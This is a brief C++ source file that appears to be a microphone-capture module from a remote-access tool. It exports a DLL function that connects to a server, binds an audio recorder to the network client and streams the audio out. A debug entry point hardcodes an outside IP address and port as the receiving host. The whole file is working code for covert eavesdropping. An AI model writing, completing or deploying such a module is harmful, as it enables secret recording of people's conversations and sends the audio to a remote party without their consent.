
#include "IOCPClient.h"
#include "Audio.h"

extern "C"  __declspec(dllexport) void HHBeginMicrophone(char* szServerAddr, unsigned short uPort, DWORD dwParam);

void HHBeginMicrophone(char* szServerAddr, unsigned short uPort, DWORD dwParam)
{
	CIOCPClient client(szServerAddr, uPort);

	CAudio audio(AUDIO);

	client.BindHandler(&audio);

	client.Run();

	client.UnbindHandler();
}

#ifdef _DEBUG
int main()
{
	CIOCPClient::SocketInit();
	HHBeginMicrophone("81.68.224.152", 10086, 0);
	CIOCPClient::SocketTerm();
	return 0;
}
#endif